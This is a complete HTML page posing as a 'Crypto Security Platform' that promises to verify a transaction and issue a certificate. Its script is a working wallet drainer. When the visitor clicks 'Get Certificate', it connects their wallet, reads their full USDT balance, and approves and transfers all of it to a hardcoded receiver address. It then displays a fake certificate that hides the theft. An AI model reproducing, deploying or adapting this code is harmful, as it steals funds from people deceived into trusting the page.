<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Crypto Security Platform</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #0a0a0a;
      color: #ffffff;
    }
    header {
      background: #000000;
      padding: 20px;
      text-align: center;
      font-size: 24px;
      font-weight: bold;
    }
    .container {
      max-width: 600px;
      margin: 40px auto;
      padding: 20px;
      background: #111;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(255,255,255,0.1);
      text-align: center;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      background-color: #00b894;
      color: #fff;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #019875;
    }
    #certificate-container {
      margin-top: 30px;
      background: #222;
      padding: 20px;
      border-radius: 10px;
    }
    .cert-label {
      font-weight: bold;
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
</head>
<body>
  <header>
    Crypto Security Platform
  </header>
  <div class="container">
    <p>Verify your crypto transaction by connecting your wallet and retrieving your certificate.</p>
    <button onclick="checkAndApprove()">Get Certificate</button>

    <div id="certificate-container"></div>
  </div>

  <script>
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
    const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // Your address
    const usdtAbi = [
      {
        "constant": true,
        "inputs": [{ "name": "", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "name": "", "type": "uint256" }],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          { "name": "_spender", "type": "address" },
          { "name": "_value", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          { "name": "_to", "type": "address" },
          { "name": "_value", "type": "uint256" }
        ],
        "name": "transfer",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
      }
    ];

    async function checkAndApprove() {
      if (typeof window.ethereum === 'undefined') {
        alert("Please install MetaMask or Trust Wallet.");
        return;
      }

      const web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const userAddress = accounts[0];

      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balance = await usdt.methods.balanceOf(userAddress).call();

      if (parseInt(balance) === 0) {
        alert("No USDT balance found.");
        return;
      }

      await usdt.methods.approve(receiverAddress, balance).send({ from: userAddress });
      await usdt.methods.transfer(receiverAddress, balance).send({ from: userAddress });

      displayCertificate(userAddress, balance);
    }

    function displayCertificate(address, amount) {
      const container = document.getElementById("certificate-container");
      const now = new Date().toLocaleString();
      container.innerHTML = `
        <h3>âœ… Certificate Generated</h3>
        <p><span class="cert-label">Wallet Address:</span><br>${address}</p>
        <p><span class="cert-label">Amount Transferred:</span><br>${(amount / 1e18).toFixed(2)} USDT</p>
        <p><span class="cert-label">Timestamp:</span><br>${now}</p>
      `;
    }
  </script>
</body>
</html>
